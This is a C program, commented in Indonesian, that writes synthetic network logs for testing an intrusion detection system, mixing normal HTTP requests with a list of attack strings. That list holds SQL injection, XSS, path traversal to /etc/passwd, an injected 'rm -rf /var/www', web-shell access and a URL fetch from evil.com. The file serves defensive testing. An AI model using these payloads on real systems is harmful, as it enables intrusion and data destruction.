/* ============================================================
 * log_generator.c
 * Menghasilkan log jaringan sintetis untuk diuji oleh IDS
 * Compile : gcc log_generator.c -o log_generator
 * Jalankan: ./log_generator <jumlah_log> <file_output>
 * ============================================================ */
#include "ids_common.h"

static const char *PROTOCOLS[] = {"TCP", "UDP", "ICMP", "HTTP"};
static const char *NORMAL_PAYLOADS[] = {
    "GET /index.html HTTP/1.1",
    "POST /login HTTP/1.1",
    "GET /api/users HTTP/1.1",
    "GET /images/logo.png",
    "POST /api/data",
    "GET /about.html",
    "PUT /api/profile",
    "GET /products?id=42"
};

static const char *ATTACK_PAYLOADS[] = {
    "GET /login.php?user=admin' OR '1'='1",
    "GET /search?q=UNION SELECT password FROM users",
    "POST /comment <script>alert('xss')</script>",
    "GET /page?file=../../../../etc/passwd",
    "POST /cmd ;rm -rf /var/www",
    "Failed password for root from 192.168.1.50",
    "SYN_SCAN detected on port 22",
    "FLOOD attack 10000 pkt/s",
    "GET /cmd.php?c=whoami",
    "GET /upload/shell.php",
    "GET /load?url=http://evil.com/x",
    "POST /buffer AAAAAAAAAAAAAAAAAAAAAAAA"
};

static void random_ip(char *buf) {
    snprintf(buf, MAX_IP_LEN, "%d.%d.%d.%d",
             (rand()%223)+1, rand()%256, rand()%256, (rand()%254)+1);
}

int main(int argc, char **argv) {
    int count = (argc > 1) ? atoi(argv[1]) : 50000;
    const char *outfile = (argc > 2) ? argv[2] : "network_logs.txt";

    if (count > MAX_LOGS) count = MAX_LOGS;

    FILE *fp = fopen(outfile, "w");
    if (!fp) { perror("fopen"); return 1; }

    srand((unsigned)time(NULL));
    int attack_count = 0;

    for (int i = 0; i < count; i++) {
        char src[MAX_IP_LEN], dst[MAX_IP_LEN];
        random_ip(src); random_ip(dst);

        const char *proto = PROTOCOLS[rand() % 4];
        int sport = rand() % 65535;
        int dport = (rand() % 5 == 0) ? 80 : (rand() % 65535);
        int bytes = rand() % 1500 + 40;

        /* ~15% log mengandung pola serangan */
        const char *payload;
        if (rand() % 100 < 15) {
            payload = ATTACK_PAYLOADS[rand() % (sizeof(ATTACK_PAYLOADS)/sizeof(char*))];
            attack_count++;
        } else {
            payload = NORMAL_PAYLOADS[rand() % (sizeof(NORMAL_PAYLOADS)/sizeof(char*))];
        }

        time_t t = time(NULL) - (rand() % 86400);
        struct tm *tm_info = localtime(&t);
        char ts[32];
        strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", tm_info);

        fprintf(fp, "%s|%s|%s|%d|%d|%s|%d|%s\n",
                ts, src, dst, sport, dport, proto, bytes, payload);
    }

    fclose(fp);
    printf("[Generator] %d log dibuat di '%s' (~%d mengandung pola serangan)\n",
           count, outfile, attack_count);
    return 0;
}
